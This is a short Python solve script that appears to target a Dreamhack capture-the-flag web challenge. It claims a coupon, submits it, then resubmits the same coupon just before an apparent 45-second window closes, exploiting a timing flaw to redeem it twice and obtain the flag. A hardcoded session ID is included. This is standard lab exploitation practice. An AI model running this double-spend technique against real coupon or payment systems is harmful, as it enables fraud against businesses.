import requests
import json
import time

url = "http://host3.dreamhack.games:8843/"
session_id = "3c94db681cc64602b30334f6f4ddd06a"

def claim_coupon(session):
    headers = {"Authorization": session}
    res = requests.get(url + "coupon/claim", headers=headers)
    if res.status_code == 200:
        coupon = json.loads(res.text)["coupon"]
        print("Coupon claimed successfully")
        print("Coupon:", coupon)
        return coupon
    else:
        raise Exception("Failed to claim coupon")

def submit_coupon(session, coupon):
    headers = {"Authorization": session, "coupon": coupon}
    res = requests.get(url + "coupon/submit", headers=headers)
    print("1st response:", res.text)
    if res.status_code != 200:
        raise Exception("Failed to submit first coupon")

    print("Waiting 45 seconds...")
    start_time = time.time() 

    while time.time() - start_time < 44.8:
        elapsed_time = time.time() - start_time
        print(f"Elapsed time: {int(elapsed_time)} seconds", end='\r')  
        time.sleep(1) 

    print("complete!")

    res = requests.get(url + "coupon/submit", headers=headers)
    print("2nd response:", res.text)
    if res.status_code != 200:
        raise Exception("Failed to submit 2nd coupon")

def claim_flag(session):
    headers = {"Authorization": session}
    res = requests.get(url + "/flag/claim", headers=headers)
    flag = json.loads(res.text)["message"]
    print("Flag:", flag)

if __name__ == "__main__":
    try:
        session = session_id
        coupon = claim_coupon(session)
        submit_coupon(session, coupon)
        claim_flag(session)
    except Exception as e:
        print(e)
